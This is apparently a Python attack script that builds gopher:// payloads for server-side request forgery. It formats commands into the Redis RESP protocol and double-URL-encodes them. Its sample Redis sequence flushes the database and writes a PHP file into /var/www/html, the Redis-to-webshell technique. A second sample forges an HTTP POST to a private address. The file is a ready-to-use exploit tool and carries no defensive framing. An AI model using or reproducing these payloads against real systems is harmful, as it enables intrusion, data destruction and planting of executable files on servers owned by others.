import socket
import requests
import re
from urllib.parse import quote

# gopher利用脚本，此脚本内容可以任意的修改
# 
# 最新测试版本


CRLF = '\r\n'


# redis_format函数用于进行redis的RESP协议的格式化
def redis_format(command):
    cmd = []
    data = command.split('\n')
    for x in data:
        if re.match(r'\s*',x):
            data.remove(x)
    cmd = data

    result = []
    for x in range(len(cmd)):
        rn_list = cmd[x].split(' ')              # 进行空格切分
        rn_zong_len = len(rn_list)              # *? 表示总长度的获取
        for y in range(len(rn_list)):
            rn_list[y] = '$'+str(len(rn_list[y]))+CRLF+rn_list[y].replace("^",' ')
        

        result.append('*'+str(rn_zong_len)+CRLF+CRLF.join(rn_list)+CRLF)
    return ''.join(result).encode('utf-8')




# 此函数提供gopher格式化的数据。仅仅是将传入的payload进行gopher协议的转化。并不提供其他的功能，如果需要进行redis字符串的格式化需要提前使用上面的函数先进行格式化。
# 需要注意的是，linux中默认的换行是\n LF。而http请求中的换行为\r\n
def gopher_format(payload_str,host,port):
    scheme = "gopher://"
    payload_str = re.sub(r'(?<!\r)\n',CRLF,payload_str)     # 正则的反向否定预查
    raw_payload = scheme + str(host) + ':' + str(port) + '/_' + quote(quote(payload_str))
    payload = raw_payload
    return payload




if __name__ == "__main__":

    cmd_2 = '''         
flushall
set 1 <?php phpinfo();?>
config set dir /var/www/html
config set dbfilename config.php
save
    '''

    cmd_3 = '''POST / HTTP/1.1
Host: 192.168.2.121
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Connection: close
Upgrade-Insecure-Requests: 1

b=2.php&a=1.php
    '''

                # 伪造http请求
# 在此组成payload即可，需要注意的是，字符串前面不能有空格或tab键
    gopher_payload = gopher_format(cmd_3,'192.168.2.121','80')
    print(gopher_payload)



                # 伪造RESP请求
# 如果要使用redis+gopher的话，那么则需要先redis_format再gopher_format
    # redis_payload = redis_format(cmd_2).decode('utf-8')
    # print(gopher_format(redis_payload,'192.168.2.81',6379))